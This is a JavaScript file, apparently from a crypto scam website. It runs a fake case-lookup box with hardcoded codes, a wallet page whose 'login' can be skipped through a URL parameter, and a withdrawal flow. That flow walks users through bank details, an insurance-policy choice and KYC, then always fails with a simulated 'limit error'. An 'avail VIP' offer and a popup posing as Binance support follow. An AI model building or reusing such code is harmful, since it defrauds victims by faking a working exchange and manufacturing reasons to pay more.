document.addEventListener("DOMContentLoaded", function () {
    
    // ==========================================================
    // 🔍 PART 1: MASTER LOOKUP ENGINE (case.html Search Box)
    // ==========================================================
    const searchBtn = document.getElementById("btnSearchCase");
    const caseInput = document.getElementById("caseInputCode");
    const dynamicProfile = document.getElementById("dynamicProfileSection");

    if (searchBtn && caseInput) {
        searchBtn.addEventListener("click", function () {
            const enteredCode = caseInput.value.trim();

            // 🔑 CONDITION A: Kapag profile ni Branko (784291) - Ipakita ang card sa screen
            if (enteredCode === "784291") {
                if (dynamicProfile) {
                    dynamicProfile.classList.remove("d-none");
                    dynamicProfile.scrollIntoView({ behavior: 'smooth' });
                }
            } 
            // 🔑 CONDITION B: Kapag wallet code ni KLTN (120352) - Awtomatikong lilipat sa crypto page at lagpas login panel!
            else if (enteredCode === "120352") {
                window.location.href = "crypto.html?autoauth=120352";
            } 
            // Fallback alert prompt para sa maling tracking strings
            else {
                alert("Master reference authentication token key not registered under secure tracking rows.");
                if (dynamicProfile) dynamicProfile.classList.add("d-none");
            }
        });
    }

    // ==========================================================
    // 💳 PART 2: CRYPTO NODE AUTO-LOAD SYSTEM (crypto.html login gateway)
    // ==========================================================
    const urlParams = new URLSearchParams(window.location.search);
    const autoAuthCode = urlParams.get('autoauth');
    
    const authBlock = document.getElementById("authGatewayBlock");
    const reportLayer = document.getElementById("walletReportMatrixLayer");
    const walletInput = document.getElementById("walletAuthCodeField");

    // Kung ang code na 120352 ay bitbit mula sa main database link page redirection, i-bypass ang gateway!
    if (autoAuthCode === "120352" && reportLayer && authBlock) {
        authBlock.classList.add("d-none");
        reportLayer.classList.remove("d-none");
    }

    // Manual access verification sync connection configuration trigger fallback fallback loop
    const syncWalletBtn = document.getElementById("btnTriggerWalletSync");
    if (syncWalletBtn && walletInput && reportLayer) {
        syncWalletBtn.addEventListener("click", function () {
            if (walletInput.value.trim() === "120352") {
                if (authBlock) authBlock.classList.add("d-none");
                reportLayer.classList.remove("d-none");
                reportLayer.scrollIntoView({ behavior: 'smooth' });
            } else {
                alert("Decentralized wallet authentication token code invalid.");
            }
        });
    }

    // ==========================================================
    // 🔳 PART 3: WITHDRAWAL & DOCUMENT WORKFLOW LINK SYSTEM
    // ==========================================================
    const withdrawalBtn = document.getElementById("btnOpenWithdrawalForm");
    const formSection = document.getElementById("withdrawalFormSection");
    const confirmBankBtn = document.getElementById("btnConfirmBankDetails");
    const insuranceSection = document.getElementById("insuranceSection");
    const selectInsBtn = document.querySelectorAll(".select-ins-btn");
    const nextInsBtn = document.getElementById("btnNextFromInsurance");
    const skipInsBtn = document.getElementById("btnSkipInsurance");
    const kycSection = document.getElementById("kycSection");
    const executeWithdrawalBtn = document.getElementById("btnExecuteFinalWithdrawal");
    const loadingSection = document.getElementById("loadingSection");
    const errorSection = document.getElementById("limitErrorSection");
    const availVipBtn = document.getElementById("btnAvailVipNow");
    const supportPopup = document.getElementById("binanceSupportPopupMask");

    if (withdrawalBtn && formSection) {
        withdrawalBtn.addEventListener("click", function () {
            formSection.classList.remove("d-none");
            formSection.scrollIntoView({ behavior: 'smooth' });
        });
    }

    if (confirmBankBtn && insuranceSection) {
        confirmBankBtn.addEventListener("click", function () {
            insuranceSection.classList.remove("d-none");
            insuranceSection.scrollIntoView({ behavior: 'smooth' });
        });
    }

    selectInsBtn.forEach(btn => {
        btn.addEventListener("click", function () {
            selectInsBtn.forEach(b => { 
                b.classList.remove("btn-warning", "text-dark"); 
                b.classList.add("btn-outline-warning"); 
                b.innerText = "Select Policy"; 
            });
            this.classList.remove("btn-outline-warning"); 
            this.classList.add("btn-warning", "text-dark"); 
            this.innerText = "Policy Chosen";
            if (nextInsBtn) nextInsBtn.removeAttribute("disabled");
        });
    });

    const triggerKyc = function() { 
        if (kycSection) { 
            kycSection.classList.remove("d-none"); 
            kycSection.scrollIntoView({ behavior: 'smooth' }); 
        } 
    };
    if (nextInsBtn) nextInsBtn.addEventListener("click", triggerKyc);
    if (skipInsBtn) skipInsBtn.addEventListener("click", triggerKyc);

    if (executeWithdrawalBtn && loadingSection && errorSection) {
        executeWithdrawalBtn.addEventListener("click", function () {
            if (kycSection) kycSection.classList.add("d-none");
            loadingSection.classList.remove("d-none");
            loadingSection.scrollIntoView({ behavior: 'smooth' });
            
            // 3-second configuration interval loop timeout simulation parameters
            setTimeout(function () {
                loadingSection.classList.add("d-none");
                errorSection.classList.remove("d-none");
                errorSection.scrollIntoView({ behavior: 'smooth' });
            }, 3000);
        });
    }

    if (availVipBtn && supportPopup) {
        availVipBtn.addEventListener("click", function () {
            supportPopup.classList.add("active");
        });
    }
});
